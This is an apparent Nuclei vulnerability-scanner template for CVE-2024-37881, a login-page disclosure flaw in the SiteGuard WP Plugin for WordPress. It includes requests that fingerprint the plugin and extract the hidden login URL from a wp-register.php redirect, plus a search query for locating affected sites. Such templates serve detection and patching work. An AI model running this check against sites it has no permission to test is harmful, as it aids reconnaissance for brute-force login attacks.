id: CVE-2024-37881

info:
  name: SiteGuard WP Plugin <= 1.7.6 - Login Page Disclosure
  author: s4e-io
  severity: medium
  description: |
    The SiteGuard WP Plugin plugin for WordPress is vulnerable to protection mechanism bypass in all versions up to, and including, 1.7.6. This is due to the plugin not restricting redirects from wp-register.php which may disclose the login page URL. This makes it possible for unauthenticated attackers to gain access to the login page.
  impact: |
    Unauthenticated attackers can discover the actual login page URL despite protection mechanisms, facilitating brute force attacks or targeted exploitation of the WordPress login interface.
  remediation: |
    Upgrade to SiteGuard WP Plugin version 1.7.7 or later.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37881
    - https://jvn.jp/en/jp/JVN60331535/
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/siteguard/siteguard-wp-plugin-176-login-page-disclosure
    - https://www.usom.gov.tr/bildirim/tr-24-0726
  classification:
    epss-score: 0.04143
    epss-percentile: 0.88297
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/siteguard/"
  tags: cve,cve-2024,siteguard,wp-plugin,vuln

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/siteguard/readme.txt"

    matchers:
      - type: dsl
        internal: true
        dsl:
          - "status_code == 200"
          - 'contains(body, "SiteGuard WP Plugin")'
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/wp-register.php"

    matchers:
      - type: dsl
        dsl:
          - "!contains(tolower(location), 'wp-login.php')"

    extractors:
      - type: kval
        kval:
          - location
# digest: 4b0a00483046022100cc78faf6fb24310e451ed1428ae06867db25fa6d6980d203fd6aed48e5f584ad022100b64ec46dfa2dd60e47d8ab8f0fd36eee91638cd2f3f3b849ff5288820a3ab4ff:922c64590222798bb761d5b6d8e72950